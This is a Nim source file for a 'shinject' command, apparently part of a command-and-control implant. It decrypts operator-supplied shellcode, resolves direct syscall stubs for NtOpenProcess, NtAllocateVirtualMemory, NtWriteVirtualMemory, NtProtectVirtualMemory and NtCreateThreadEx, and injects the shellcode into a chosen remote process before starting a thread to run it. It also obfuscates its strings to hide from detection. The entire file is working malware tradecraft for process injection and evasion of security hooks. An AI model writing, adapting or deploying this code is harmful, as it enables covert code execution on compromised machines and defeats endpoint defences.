import winim/lean
from strutils import parseInt
import ../../util/crypto
from ../../util/risky/dinvoke import SYSCALL_STUB_SIZE, GetSyscallStub
from ../../util/risky/delegates import NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx

proc shinject*(li : Listener, args : varargs[string]) : string =
    # This should not happen due to preprocessing
    if not args.len >= 3:
        result = obf("Invalid number of arguments received. Usage: 'shinject [PID] [localfilepath]'.")
        return

    let
        processId: int = parseInt(args[0])
        shellcodeB64: string = args[1]
        currProcess = GetCurrentProcessId()
    var
        ret: WINBOOL
        hProcess: HANDLE
        hProcessCurr: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, currProcess)
        hThread: HANDLE
        oa: OBJECT_ATTRIBUTES
        ci: CLIENT_ID
        allocAddr: LPVOID
        bytesWritten: SIZE_T
        oldProtect: DWORD

    result = obf("Injecting shellcode into remote process with PID ") & $processId & obf("...\n")

    ci.UniqueProcess = processId

    let sysNtOpenProcess = VirtualAllocEx(
        hProcessCurr,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE)

    var dNtOpenProcess: NtOpenProcess = cast[NtOpenProcess](cast[LPVOID](sysNtOpenProcess));
    VirtualProtect(cast[LPVOID](sysNtOpenProcess), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect);
    discard GetSyscallStub("NtOpenProcess", cast[LPVOID](sysNtOpenProcess));

    var sysNtAllocateVirtualMemory: HANDLE = cast[HANDLE](sysNtOpenProcess) + cast[HANDLE](SYSCALL_STUB_SIZE)
    let dNtAllocateVirtualMemory = cast[NtAllocateVirtualMemory](cast[LPVOID](sysNtAllocateVirtualMemory));
    VirtualProtect(cast[LPVOID](sysNtAllocateVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect);
    discard GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](sysNtAllocateVirtualMemory));

    var sysNtWriteVirtualMemory: HANDLE = cast[HANDLE](sysNtAllocateVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
    let dNtWriteVirtualMemory = cast[NtWriteVirtualMemory](cast[LPVOID](sysNtWriteVirtualMemory));
    VirtualProtect(cast[LPVOID](sysNtWriteVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect);
    discard GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](sysNtWriteVirtualMemory));

    var sysNtProtectVirtualMemory: HANDLE = cast[HANDLE](sysNtWriteVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
    let dNtProtectVirtualMemory = cast[NtProtectVirtualMemory](cast[LPVOID](sysNtProtectVirtualMemory));
    VirtualProtect(cast[LPVOID](sysNtProtectVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect);
    discard GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](sysNtProtectVirtualMemory));

    var sysNtCreateThreadEx: HANDLE = cast[HANDLE](sysNtProtectVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
    let dNtCreateThreadEx = cast[NtCreateThreadEx](cast[LPVOID](sysNtCreateThreadEx));
    VirtualProtect(cast[LPVOID](sysNtCreateThreadEx), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect);
    discard GetSyscallStub("NtCreateThreadEx", cast[LPVOID](sysNtCreateThreadEx));

    ret = dNtOpenProcess(
        addr hProcess,
        PROCESS_ALL_ACCESS,
        addr oa,
        addr ci)

    if (ret == 0):
        result.add(obf("[+] NtOpenProcess OK\n"))
        # result.add(obf("  \\_ Process handle: ") & $hProcess & obf("\n"))
    else:
        result.add(obf("[-] NtOpenProcess failed! Check if the target PID exists and that you have the appropriate permissions\n"))
        return

    var dec = decryptData(shellcodeB64, li.cryptKey)
    var shellcode: seq[byte] = newSeq[byte](dec.len)
    var shellcodeSize: SIZE_T = cast[SIZE_T](shellcode.len)
    copyMem(shellcode[0].addr, dec[0].addr, dec.len)

    ret = dNtAllocateVirtualMemory(
        hProcess,
        addr allocAddr,
        0,
        addr shellcodeSize,
        MEM_COMMIT,
        PAGE_READWRITE)

    if (ret == 0):
        result.add(obf("[+] NtAllocateVirtualMemory OK\n"))
        result.add(obf("  \\_ Allocated: ") & $shellcode.len & obf(" bytes\n"))
        # result.add(obf("  \\_ Memory address: ") & $(cast[int](allocAddr).toHex()) & obf("\n"))
    else:
        result.add(obf("[-] NtAllocateVirtualMemory failed!\n"))
        return

    ret = dNtWriteVirtualMemory(
        hProcess,
        allocAddr,
        unsafeAddr shellcode[0],
        shellcodeSize,
        addr bytesWritten)

    if (ret == 0):
        result.add(obf("[+] NtWriteVirtualMemory OK\n"))
        result.add(obf("  \\_ Bytes written: ") & $bytesWritten & obf("\n"))
    else:
        result.add(obf("[-] NtWriteVirtualMemory failed!\n"))
        return

    var protectAddr = allocAddr
    var shellcodeSize2: SIZE_T = cast[SIZE_T](shellcode.len)

    ret = dNtProtectVirtualMemory(
        hProcess,
        addr protectAddr,
        addr shellcodeSize2,
        PAGE_EXECUTE_READ,
        addr oldProtect)

    if (ret == 0):
        result.add(obf("[+] NtProtectVirtualMemory OK\n"))
    else:
        result.add(obf("[-] NtProtectVirtualMemory failed!\n"))
        return

    ret = dNtCreateThreadEx(
        addr hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        allocAddr,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL)

    if (ret == 0):
        result.add(obf("[+] NtCreateThreadEx OK\n"))
        # result.add(obf("  \\_ Thread handle: ") & $hThread & obf("\n"))
    else:
        result.add(obf("[-] NtCreateThreadEx failed!\n"))
        return

    CloseHandle(hThread)
    CloseHandle(hProcess)

    result.add(obf("[+] Injection successful!")) 